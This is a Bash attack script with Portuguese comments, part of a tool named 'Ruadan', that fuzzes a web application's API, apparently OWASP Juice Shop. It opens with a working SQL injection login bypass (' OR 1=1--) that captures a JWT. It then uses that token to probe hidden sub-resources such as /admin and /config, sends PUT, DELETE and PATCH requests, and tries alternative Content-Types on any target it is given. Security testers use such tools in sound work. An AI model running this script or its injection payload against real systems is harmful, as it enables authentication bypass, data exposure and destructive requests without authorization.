#!/bin/bash
# ==============================================================================
# Ruadan — Fuzzing Recursivo de Conteúdo (sub-recursos + métodos não doc)
# ==============================================================================
# Uso: recursive_fuzz.sh <target> <port> <scheme>
#
# POR QUE: fuzzers tradicionais fazem UMA passada na raiz. Aplicações modernas
# têm hierarquias de API: /api/ → /api/Users → /api/Users/1 → /api/Users/1/orders
# Este script:
#   1. Descobre endpoints da raiz (GET /) e das APIs conhecidas (/api, /rest)
#   2. Para CADA endpoint que responde 200, fuzza sub-recursos (1,2,3 / search, list, all)
#   3. Testa métodos não documentados (PUT/DELETE/PATCH em GET endpoints)
#   4. Testa Content-Types alternativos (XML, form-data, plain text)
# Emite: RECURSIVE_FINDING: <tipo> <endpoint> <detalhe>
# ==============================================================================
set -u

TARGET="${1:?uso: recursive_fuzz.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"

BASE_URL="${SCHEME}://${TARGET}:${PORT}"
if [ "$SCHEME" = "http" ]; then
    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
    if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
        BASE_URL="${_redir%/}"
    fi
fi
echo "[recursive-fuzz] Alvo: ${BASE_URL}"

# Captura JWT
LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
AUTH=""
[ -n "$JWT" ] && AUTH="Authorization: Bearer ${JWT}"
echo "[recursive-fuzz] JWT: ${#JWT} chars"

VULN_COUNT=0

# ---- 1. Endpoints raiz para expandir recursivamente ------------------------------
ROOT_ENDPOINTS=(
    "/api"
    "/api/Users"
    "/api/Products"
    "/api/Orders"
    "/rest/products"
    "/rest/user/whoami"
    "/rest/products/search?q=a"
)

SUB_RESOURCES=("" "/1" "/2" "/3" "/search" "/list" "/all" "/count" "/admin" "/debug" "/config" "/schema" "/_search" "/bulk")

for ROOT in "${ROOT_ENDPOINTS[@]}"; do
    # Verifica se o endpoint raiz responde
    ROOT_CODE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${ROOT}" 2>/dev/null)
    [ "$ROOT_CODE" != "200" ] && [ "$ROOT_CODE" != "500" ] && continue

    echo "[recursive-fuzz] Expandindo ${ROOT} (HTTP ${ROOT_CODE})..."

    for SUB in "${SUB_RESOURCES[@]}"; do
        EP="${ROOT}${SUB}"
        CODE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
        SIZE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{size_download}" "${BASE_URL}${EP}" 2>/dev/null)

        if [ "$CODE" = "200" ] && [ "$SIZE" -gt 50 ]; then
            echo "RECURSIVE_FINDING: GET ${EP} (HTTP ${CODE}, ${SIZE}B) — sub-recurso acessível"
            VULN_COUNT=$((VULN_COUNT+1))
        elif [ "$CODE" = "500" ]; then
            echo "RECURSIVE_FINDING: GET ${EP} (HTTP ${CODE}) — erro interno (endpoint existe mas quebra)"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done
done

# ---- 2. Métodos não documentados ------------------------------------------------
echo "[recursive-fuzz] Testando métodos não documentados..."

METHODS=("PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")

for EP in "${ROOT_ENDPOINTS[@]}"; do
    GET_CODE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
    for METHOD in "${METHODS[@]}"; do
        M_CODE=$(curl $CURL_OPTS -X "$METHOD" -H "$AUTH" -H "Content-Type: application/json" \
            -d '{"test":"ruadan"}' -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
        # Se o método é aceito (não 405 Method Not Allowed) e difere de GET
        if [ "$M_CODE" != "405" ] && [ "$M_CODE" != "404" ] && [ "$M_CODE" != "501" ]; then
            if [ "$M_CODE" != "$GET_CODE" ] || [ "$METHOD" = "DELETE" ] || [ "$METHOD" = "PUT" ]; then
                echo "RECURSIVE_FINDING: METHOD_ALLOWED ${METHOD} ${EP} (HTTP ${M_CODE} vs GET ${GET_CODE}) — método não documentado aceito"
                VULN_COUNT=$((VULN_COUNT+1))
            fi
        fi
    done
done

# ---- 3. Content-Type alternativo --------------------------------------------------
echo "[recursive-fuzz] Testando Content-Types alternativos..."

CONTENT_TYPES=(
    "application/xml"
    "application/x-www-form-urlencoded"
    "text/plain"
    "multipart/form-data; boundary=ruadan"
)

for EP in "/rest/user/login" "/api/Users" "/rest/save/review"; do
    for CT in "${CONTENT_TYPES[@]}"; do
        RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: ${CT}" -d "email=test&password=test" 2>/dev/null)
        CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: ${CT}" -d "email=test&password=test" -o /dev/null -w "%{http_code}" 2>/dev/null)
        if [ "$CODE" = "200" ]; then
            echo "RECURSIVE_FINDING: CONTENT_TYPE ${CT} em ${EP} — aceito (HTTP ${CODE})"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done
done

echo "[recursive-fuzz] Descobertas recursivas: ${VULN_COUNT}"
exit 0
